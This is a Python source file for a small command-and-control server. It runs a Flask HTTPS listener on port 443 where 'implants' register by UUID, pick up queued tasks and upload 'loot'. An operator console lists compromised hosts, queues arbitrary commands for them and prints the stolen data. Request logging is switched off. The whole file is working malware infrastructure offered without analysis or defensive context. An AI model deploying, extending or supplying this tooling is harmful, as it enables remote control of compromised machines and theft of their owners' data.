# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
import threading
from flask import Flask, request, jsonify
import ssl
import logging

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.disabled = True

implants = {}
selected_implant = None

@app.route("/checkin", methods=["POST"])
def checkin():
    data = request.json
    uuid = data.get("uuid")
    if uuid:
        implants.setdefault(uuid, {"info": data, "tasks": [], "loot": []})
        return jsonify({"status": "registered"})
    return jsonify({"error": "missing uuid"}), 400

@app.route("/tasks", methods=["GET"])
def get_tasks():
    uuid = request.args.get("uuid")
    if uuid in implants:
        tasks = implants[uuid]["tasks"]
        implants[uuid]["tasks"] = []
        return jsonify({"tasks": tasks})
    return jsonify({"error": "unknown implant"}), 404

@app.route("/loot", methods=["POST"])
def receive_loot():
    data = request.json
    uuid = data.get("uuid")
    loot = data.get("loot")
    if uuid in implants:
        implants[uuid]["loot"].append(loot)
        return jsonify({"status": "loot received"})
    return jsonify({"error": "unknown implant"}), 404

def run_flask():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')
    app.run(host='0.0.0.0', port=443, ssl_context=context, debug=False)

def operator_cli():
    global selected_implant
    while True:
        cmd = input("C2> ").strip()
        if cmd == "list":
            for i, uuid in enumerate(implants):
                print(f"[{i}] {uuid} - {implants[uuid]['info']}")
        elif cmd.startswith("select "):
            try:
                idx = int(cmd.split()[1])
                selected_implant = list(implants.keys())[idx]
                print(f"Selected implant: {selected_implant}")
            except:
                print("Invalid index")
        elif cmd.startswith("task "):
            if not selected_implant:
                print("No implant selected.")
                continue
            task = cmd[len("task "):]
            implants[selected_implant]["tasks"].append(task)
            print(f"Task queued for {selected_implant}")
        elif cmd == "loot":
            if not selected_implant:
                print("No implant selected.")
                continue
            loot = implants[selected_implant]["loot"]
            for entry in loot:
                print(f"LOOT: {entry}")
        elif cmd == "exit":
            print("Exiting CLI...")
            break
        else:
            print("Commands: list, select <idx>, task <cmd>, loot, exit")

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    operator_cli()
